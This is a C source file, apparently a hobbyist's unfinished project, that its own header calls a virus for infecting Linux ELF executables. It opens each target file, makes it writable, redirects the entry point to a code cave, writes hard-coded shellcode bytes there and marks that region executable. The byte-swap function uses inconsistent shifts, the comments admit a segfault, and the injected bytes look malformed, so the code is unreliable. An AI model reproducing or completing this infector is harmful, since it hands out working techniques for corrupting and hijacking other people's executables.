// virus.c
// written by Kate Rodionoff
// on 06/10/23
// virus that infects ELF executable files on Linux

// verify that file is an ELF executable
// find entry point
// inject simple code (to start with)

#include "include/ElfFile.h"
#include "include/CodeCave.h"
#include <fcntl.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MIN_ARGS 2
#define MOV_RET_INSTR "\x80\xd2" // note: bytes are presented in reverse order

Elf64_Addr convertLittleEndian(Elf64_Addr addr);

int main(int argc, char **argv) {
    if (argc < MIN_ARGS) {
        fprintf(stdout, "Too few arguments to call program\n");
        exit(0);
    }

    printf("argc: %d\n", argc);

    for (int i = 1; i < argc; i++) {
        int fd = open(argv[i], O_RDWR);

        if (!Elf(fd)) {
            fprintf(stderr, "Not elf file!\n");
            goto end;
        }

        char *args[2] = {"+w", argv[i]};
        pid_t pid;
        posix_spawn(&pid, "chmod", NULL, NULL, args, NULL);

        Elf64_Ehdr ehdr = ElfExtractHeader(fd);
        printf("Extracted elf header!\n");
        Elf64_Phdr phdr = ElfExtractProgramHeader(fd, ehdr);
        printf("Extracted program header!\n");

        // store the original return address
        Elf64_Addr original = ehdr.e_entry;
        printf("Original entry point at %d\n", original);

        CodeCave codeCave = FindCodeCave(fd, phdr, ehdr);
        printf("Found code cave at %d with offset %d and size %d\n", codeCave.vaddr, codeCave.offset, codeCave.size);
        ehdr.e_entry = codeCave.vaddr;
        int err = lseek(fd, 0, SEEK_SET);
        if (err < 0) {
            printf("Couldn't lseek to start of file\n");
            goto end;
        }
        write(fd, &ehdr, sizeof(ehdr));
        
        Elf64_Addr shiftedAddr = convertLittleEndian(original);
        printf("Shifted address\n");

        err = lseek(fd, codeCave.offset, SEEK_SET);
        // is this bad? Does this make me the worst programmer ever? Probably
        // this could easily be a function
        // I'm leaving this as a goto right now
        // TODO: care about code style
        if (err < 0) {
            fprintf(stdout, "Couldn't lseek to code cave position\n");
            goto end;
        }
        // are these zero bytes going to be identified as a null terminator?
        //dprintf(fd, "%d\x80\xd2", shiftedAddr);
        write(fd, "\xd2\x80\xc8\x1e\xd6\x5f\x03\xc0\x52\x80\x00\x00\xd6\x5f\x03\xc0", 16);
        printf("Wrote to file\n");

        err = ElfMarkExecutable(ehdr, codeCave.offset, fd);
        if (err) {
            fprintf(stdout, "Couldn't mark section executable\n");
            goto end;
        }

        end:
            close(fd);
    }
    // TODO: Fix the seg fault error :)
    return 0;
}

// converts an address into little endian
Elf64_Addr convertLittleEndian(Elf64_Addr addr) {
    // 0xffffffffffff0000
    uint64_t b0, b1, b2, b3, b4, b5, b6, b7;
    b0 = (addr & 0x00000000000000ff) << 56;
    b1 = (addr & 0x000000000000ff00) << 48;
    b2 = (addr & 0x0000000000ff0000) << 42;
    b3 = (addr & 0x00000000ff000000) << 36;
    b4 = (addr & 0x000000ff00000000) >> 8;
    b5 = (addr & 0x0000ff0000000000) >> 24;
    b6 = (addr & 0x00ff000000000000) >> 40;
    b7 = (addr & 0xff00000000000000) >> 56;

    return b0 | b1 | b2 | b3 | b4 | b5 | b6 | b7;
}

